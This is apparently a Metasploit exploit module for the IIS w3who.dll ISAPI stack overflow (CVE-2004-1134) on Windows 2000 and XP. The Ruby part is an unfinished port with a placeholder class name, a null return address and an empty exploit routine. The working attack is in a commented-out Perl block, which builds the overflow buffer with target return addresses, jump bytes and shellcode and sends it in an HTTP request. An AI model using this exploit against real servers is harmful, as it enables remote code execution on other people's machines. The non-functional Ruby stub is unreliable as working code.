require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS w3who.dll ISAPI Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the w3who.dll ISAPI
				application. This vulnerability was discovered Nicolas
				Gregoire and this code has been successfully tested against
				Windows 2000 and Windows XP (SP2). When exploiting Windows
				XP, the payload must call RevertToSelf before it will be
				able to spawn a command shell.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '12258'],
					[ 'CVE', '2004-1134'],
					[ 'URL', 'http://www.exaprobe.com/labs/advisories/esa-2004-1206.html'],
					[ 'MIL', '32'],
					[ 'BID', '11820'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 632,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",
					'MinNops'  => 128,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Dec 6 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis_w3who_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'IIS w3who.dll ISAPI Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,

	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'URL'   => [1, 'DATA', 'The URL to the DLL', '/scripts/w3who.dll'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 632,
		'BadChars'  => "\x00+&=%\x0a\x0d\x20",
		'MinNops'   => 128,
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This module exploits a stack overflow in the w3who.dll ISAPI application.
        This vulnerability was discovered Nicolas Gregoire and this code has been
        successfully tested against Windows 2000 and Windows XP (SP2). When 
        exploiting Windows XP, the payload must call RevertToSelf before it will
        be able to spawn a command shell.
}),

	'Refs'  =>  [
		['OSVDB', '12258'],
		['CVE', '2004-1134'],
		['URL', 'http://www.exaprobe.com/labs/advisories/esa-2004-1206.html'],
		['MIL', '32'],
		['BID', '11820'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Windows 2000 RESKIT DLL (Win2000)', 748,  0x01169f4a],  # pop, pop, ret magic
		['Windows 2000 RESKIT DLL (WinXP)',   748,  0x10019f4a],  # pop, pop, ret magic
	  ],

	'Keys' => ['iis'],

	'DisclosureDate' => 'Dec 6 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('URL');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET $target_path HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

	my $r = $s->Recv(-1, 5);

	if ($r =~ /Access Token/)
	{
		$self->PrintLine("[*] Found $target_path ;)");
		return $self->CheckCode('Detected');
	} else {

		$self->PrintLine("The w3who.dll ISAPI does not appear to be installed");
		return $self->CheckCode('Safe');
	}
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('URL');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $pattern = Pex::Text::EnglishText(8192);
	my $jmp = "\xe9".(pack('V', -641));

	substr($pattern, $target->[1] - 4, 4, "\x90\x90\xeb\x04");
	substr($pattern, $target->[1]    , 4, pack('V', $target->[2]));
	substr($pattern, $target->[1] + 4, length($jmp), $jmp);
	substr($pattern, $target->[1] - 4 - length($shellcode), length($shellcode), $shellcode);

	my $request =
	  "GET $target_path?$pattern HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	my $r = $s->Recv(-1, 5);
	$s->Close();

	return;
}

1;

=end


end
end	
